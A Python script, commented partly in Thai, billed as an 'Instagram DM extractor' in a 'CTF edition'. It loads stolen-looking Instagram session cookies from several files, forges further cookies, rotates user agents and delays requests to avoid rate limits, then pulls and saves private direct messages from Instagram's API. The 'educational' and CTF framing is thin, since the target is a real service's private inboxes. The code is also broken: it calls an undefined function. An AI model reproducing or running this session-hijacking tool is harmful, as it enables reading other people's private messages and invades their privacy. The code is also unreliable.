#!/usr/bin/env python3
"""
🔥 ULTIMATE INSTAGRAM DM EXTRACTOR 2025 - CTF EDITION 🔥
================================================================
💀 Mix ทุกเทคนิค CTF + Instagram API + Session Hijacking
🎯 ดึง DM แบบเซียน ใช้ requests + เทคนิคลับ
⚡ รองรับ bypass, decode, analyze, หาลูกทาง
⚠️ Educational Purpose Only!
"""
import json
import requests
import base64
import hashlib
import re
import time
import random
from pathlib import Path
from datetime import datetime
import urllib.parse
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

SESSION_PATH = Path("sensitive_data/session.json")

# 🎭 Multiple User Agents for rotation
USER_AGENTS = [
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Android 12; Mobile; rv:91.0) Gecko/91.0 Firefox/91.0",
    "Instagram 246.0.0.20.107 Android (29/10; 420dpi; 1080x2220; samsung; SM-G975F; beyond1; exynos9820; en_US; 380460137)",
    "Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
]

# 🔥 Enhanced Headers with mobile signature
def get_enhanced_headers():
    return {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9,th;q=0.8",
        "Accept-Encoding": "gzip, deflate, br",
        "X-IG-App-ID": "936619743392459",
        "X-IG-WWW-Claim": "hmac.AR0_H8nJJbOJ8qNPz5tKpzFkstbxfbp_LyEFNv41VeGQVl-e",
        "X-Instagram-AJAX": "1006630858",
        "X-Requested-With": "XMLHttpRequest",
        "X-CSRFToken": "",  # Will be set dynamically
        "Origin": "https://www.instagram.com",
        "Referer": "https://www.instagram.com/direct/inbox/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
        "Connection": "keep-alive",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache"
    }

# 🎯 Multiple API endpoints to try
API_ENDPOINTS = [
    "https://i.instagram.com/api/v1/direct_v2/inbox/",
    "https://www.instagram.com/api/v1/direct_v2/inbox/",
    "https://i.instagram.com/api/v1/direct_v2/threads/",
    "https://www.instagram.com/direct/inbox/",
    "https://i.instagram.com/api/v1/direct_v2/get_by_participants/",
]


# 🎯 CTF-style Session Loader with multiple sources
def load_sessionid():
    """Load session from multiple sources like a hacker"""
    print("🔍 Scanning for session data...")
    
    # Try main session file
    try:
        with open(SESSION_PATH) as f:
            data = json.load(f)
        print(f"✅ Loaded session from {SESSION_PATH}")
        return data["sessionid"]
    except FileNotFoundError:
        print(f"❌ {SESSION_PATH} not found")
    
    # Try other session files in workspace
    session_files = [
        "session.json",
        "fresh_sessions/working_session_1749202526.json",
        "fresh_sessions/working_session_1749202527.json",
        "alx_trading_session_fleming654.json"
    ]
    
    for file_path in session_files:
        try:
            with open(file_path) as f:
                data = json.load(f)
            if "sessionid" in data:
                print(f"✅ Found session in {file_path}")
                return data["sessionid"]
        except:
            continue
    
    print("❌ No valid session found! Create one first.")
    return None

# 🔥 Advanced DM Fetcher with bypass techniques
def fetch_dm_advanced(sessionid):
    """Advanced DM fetching with CTF bypass techniques"""
    print("🎯 Starting advanced DM extraction...")
    
    for attempt, endpoint in enumerate(API_ENDPOINTS):
        print(f"\n🔄 Attempt {attempt + 1}: {endpoint}")
        
        s = requests.Session()
        headers = get_enhanced_headers()
        
        # Random delay to avoid rate limiting
        time.sleep(random.uniform(1, 3))
        
        # Set cookies like a real session
        s.cookies.set("sessionid", sessionid, domain=".instagram.com")
        s.cookies.set("ds_user_id", str(random.randint(1000000000, 9999999999)), domain=".instagram.com")
        s.cookies.set("mid", f"Y{random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ')}{random.randint(100000, 999999)}", domain=".instagram.com")
        s.cookies.set("ig_did", f"{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}", domain=".instagram.com")
        
        s.headers.update(headers)
        
        try:
            resp = s.get(endpoint, timeout=15)
            print(f"📊 Status: {resp.status_code}")
            
            if resp.status_code == 200:
                print("✅ SUCCESS! DM data received")
                return resp.json()
            elif resp.status_code == 401:
                print("🔒 Unauthorized - session expired")
            elif resp.status_code == 403:
                print("🚫 Forbidden - rate limited or blocked")
            elif resp.status_code == 400:
                print("❌ Bad Request - check headers/cookies")
            else:
                print(f"⚠️ Unexpected status: {resp.status_code}")
                
        except requests.RequestException as e:
            print(f"❌ Network error: {e}")
            continue
    
    print("💀 All endpoints failed!")
    return None

# 🎭 CTF-style response analyzer
def analyze_response(response_data):
    """Analyze response for hidden data like CTF challenges"""
    print("\n🔍 CTF-Style Response Analysis:")
    print("=" * 50)
    
    if not response_data:
        print("❌ No data to analyze")
        return
    
    # Check for common CTF patterns
    response_str = json.dumps(response_data)
    
    # Base64 patterns
    b64_patterns = re.findall(r'[A-Za-z0-9+/]{20,}={0,2}', response_str)
    if b64_patterns:
        print(f"🔤 Found {len(b64_patterns)} potential Base64 strings:")
        for i, pattern in enumerate(b64_patterns[:5]):
            try:
                decoded = base64.b64decode(pattern).decode('utf-8', errors='ignore')
                if decoded.isprintable():
                    print(f"  [{i+1}] {pattern[:30]}... -> {decoded[:50]}")
            except:
                pass
    
    # Hidden flags or secrets
    secret_patterns = [
        r'flag\{[^}]+\}',
        r'secret[_-]?key',
        r'password[_-]?hash',
        r'token[_-]?value',
        r'api[_-]?key'
    ]
    
    for pattern in secret_patterns:
        matches = re.findall(pattern, response_str, re.IGNORECASE)
        if matches:
            print(f"🚩 Found potential secrets: {matches}")
    
    # Check for encoded data
    if 'threads' in response_data:
        threads = response_data['threads']
        print(f"📨 Analyzing {len(threads)} threads for hidden data...")
        
        for i, thread in enumerate(threads[:3]):
            if 'items' in thread:
                for item in thread['items'][:5]:
                    if 'text' in item and item['text']:
                        text = item['text']
                        # Check if text is encoded
                        if re.match(r'^[A-Za-z0-9+/]+=*$', text) and len(text) > 10:
                            try:
                                decoded = base64.b64decode(text).decode()
                                print(f"🔓 Thread {i+1} decoded text: {decoded}")
                            except:
                                pass


def print_dm_summary(dm_json):
    if not dm_json or "inbox" not in dm_json:
        print("No DM data found.")
        return
    inbox = dm_json["inbox"]
    threads = inbox.get("threads", [])
    print(f"\n📨 Found {len(threads)} DM threads:")
    for i, thread in enumerate(threads[:10]):
        users = ", ".join([u.get("username", "?") for u in thread.get("users", [])])
        last_item = thread.get("last_permanent_item", {})
        preview = last_item.get("text") or last_item.get("item_type")
        print(f"[{i+1}] Users: {users}")
        print(f"    Preview: {preview}")
        print(f"    Thread ID: {thread.get('thread_id')}")
        print("-")


def main():
    print("\n🚩 Instagram DM Extractor (requests + CTF style)")
    sessionid = load_sessionid()
    print(f"Loaded sessionid: {sessionid[:8]}... (hidden)")
    dm_json = fetch_dm(sessionid)
    print_dm_summary(dm_json)
    # Save raw output for CTF analysis
    with open("dm_raw_output.json", "w") as f:
        json.dump(dm_json, f, indent=2)
    print("\n💾 Raw DM data saved to dm_raw_output.json")

if __name__ == "__main__":
    main()
